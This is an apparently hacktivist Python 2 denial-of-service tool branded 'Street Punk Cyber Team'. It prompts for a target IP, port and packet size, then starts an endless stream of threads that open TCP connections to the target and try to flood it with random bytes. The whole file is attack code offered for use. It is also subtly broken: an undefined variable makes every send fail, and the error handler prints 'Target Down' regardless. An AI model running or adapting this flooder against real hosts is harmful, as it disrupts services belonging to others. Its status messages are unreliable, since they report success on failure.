#!/system/bin/python
from os import *
from socket import *
from string import *
from time import *
from thread import *
import sys
import os
import random

if sys.platform == "linux2":
        os.system("clear")
elif sys.platform == "win32":
        os.system("cls")
else:
        os.system("clear")
print "PPPPP   UU  UU  NN   NN  KK  KK"
print "PP  PP  UU  UU  NNN  NN  KK KK"
print "PPPPP   UU  UU  NN N NN  KKK"
print "PP      UU  UU  NN  NNN  KK KK"
print "PP      UUUUUU  NN   NN  KK  KK"
a = '"'
print "==========================================="
print "|| Street Punk Indonesia                 ||"
print "|| We are Street Punk Cyber Team         ||"
print "|| We are family and we fight for justice||"
print "|| Dont Forget Us !                      ||"
print "=========================================="
print
print "IP Adress Target:"
host = raw_input("Punk ~ ")
print "Port :"
port = input("Punk ~ ")
print "Ukuran Paket [Max 65507]:"
package = input("Punk ~ ")
packet = random._urandom(package)


def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sock1.sendto(packet, (ip,port))
        sleep(99)
        sock1.close
    except:
        print "[+] Target Down, Tetap Menyerang !!"

n = 0


while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "Koneksi Terputus, Periksa koneksi internet anda"
    print "[+] Pogo!! Pogo!! Pogo!! Pogo!! Pogo!!"
    sleep(0.1)
